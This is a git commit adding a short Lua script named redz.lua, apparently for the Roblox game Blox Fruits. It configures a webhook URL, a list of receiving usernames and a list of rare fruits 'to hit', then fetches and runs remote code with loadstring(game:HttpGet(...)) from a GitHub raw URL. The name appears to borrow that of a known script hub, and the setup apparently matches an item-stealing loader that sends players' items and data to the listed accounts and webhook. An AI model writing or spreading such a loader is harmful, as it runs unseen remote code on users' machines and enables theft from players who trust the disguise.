fd75e019b1f185839e01eb31e8ae2d906d4dc8b1
reds <ashiramir27@gmail.com>
2025-04-14 12:50:21 +0500

    Update and rename ...lua to redz.lua

---
+++ redz.lua
@@ -0,0 +1,5 @@
+webhook = "https://webhook-protect.vercel.app/api/webhook?id=YXhCTnY4N0ZUYmxOM1FfLXNWVFd5UTpObHNHY3FobURISXJKeUFtYTZaWWpsX3o2b2JLNEFsU0pUbnJfWFM0dlYtakdaVDNpdE1ia1RSaHFacEZnNDVsN1g2UTd0NUdPZ3BXNXBjNFV4cks5ck5lc2x1cXN5RXZFZGs4bXBEcll6V251Ty1BWHdZamM3aEp3dTI1SFhVTzFCSmNVN0lUVzRJeGMzWkdKdEpSSXAwUU5rc2NtSmJyTkNTazgxQ3laR3c"
+Usernames = {"Ammar_Ronaldo96", "Ammar_Ronaldo96"} -- << Your username(-s).
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/reasonrekt/stuFF/refs/heads/main/wowowo"))()
